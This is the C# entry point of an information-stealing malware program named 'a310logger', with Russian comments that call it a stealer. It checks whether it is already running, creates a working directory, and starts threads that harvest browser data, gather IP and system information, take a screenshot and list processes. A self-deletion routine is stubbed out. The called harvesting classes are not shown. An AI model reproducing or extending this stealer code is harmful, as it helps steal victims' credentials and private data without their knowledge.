using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace a310logger
{
    class Program
    {
        public static void Main(string[] args)
        {
            if (!File.Exists(Help.ExploitDir)) // Проверка запущен ли уже стиллер
            {
                if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 1) // Проверка запущен ли уже стиллер
                {
                    try
                    {
                        Directory.CreateDirectory(Help.ExploitDir);
                        List<Thread> Threads = new List<Thread>();

                        Threads.Add(new Thread(() => Browsers.Start())); // Старт потока с браузерами


                        Threads.Add(new Thread(() =>
                        {
                            Help.Ethernet(); // Получение информации о айпи
                            Screen.GetScreen(); // Скриншот экрана
                            ProcessList.WriteProcesses(); // Получение списка процессов
                            SystemInfo.GetSystem(); // Скриншот экрана
                        }));
                      

                        foreach (Thread t in Threads)
                            t.Start();
                        foreach (Thread t in Threads)
                            t.Join();
                                          

                        Finish(); // Автоудаление

                    }

                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
            }
        }

        static void Finish()
        {
            //Thread.Sleep(15000);
            //Directory.Delete(Help.ExploitDir + "\\", true);
            //Environment.Exit(0);
        }

    }
}
